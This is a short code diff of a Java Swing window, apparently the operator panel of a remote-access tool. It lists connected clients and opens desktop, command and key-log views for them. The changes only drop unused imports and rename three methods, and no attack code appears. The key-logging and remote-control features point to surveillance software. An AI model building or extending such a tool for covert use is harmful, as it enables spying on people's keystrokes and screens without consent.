@@ -7,18 +7,14 @@ import Ultils.NetUtils;
 import Ultils.Packet;
 
 import java.awt.Color;
-import java.awt.Font;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
-import java.text.NumberFormat;
 import java.util.ArrayList;
 import java.util.List;
 
 import javax.swing.DefaultListModel;
-import javax.swing.JButton;
-import javax.swing.JFormattedTextField;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JList;
@@ -30,7 +26,6 @@ import javax.swing.JTabbedPane;
 import javax.swing.SwingConstants;
 import javax.swing.border.EmptyBorder;
 import javax.swing.border.LineBorder;
-import javax.swing.text.NumberFormatter;
 
 
 public class GuiMain extends JFrame {
@@ -92,7 +87,7 @@ public class GuiMain extends JFrame {
             @Override
             public void actionPerformed(ActionEvent arg0) {
                 for (ConnectedClient cc : clientList.getSelectedValuesList()) {
-                    cc.openDesktopView();
+                    cc.OpenDesktopView();
                 }
             }
 
@@ -101,7 +96,7 @@ public class GuiMain extends JFrame {
             @Override
             public void actionPerformed(ActionEvent e) {
                 for (ConnectedClient cc : clientList.getSelectedValuesList()) {
-                    cc.openCommandView();
+                    cc.OpenCommandView();
                 }
             }
         }));
@@ -109,7 +104,7 @@ public class GuiMain extends JFrame {
             @Override
             public void actionPerformed(ActionEvent arg0) {
                 for (ConnectedClient cc : clientList.getSelectedValuesList()) {
-                    cc.openKeyLogView();
+                    cc.OpenKeyLogView();
                 }
             }
 
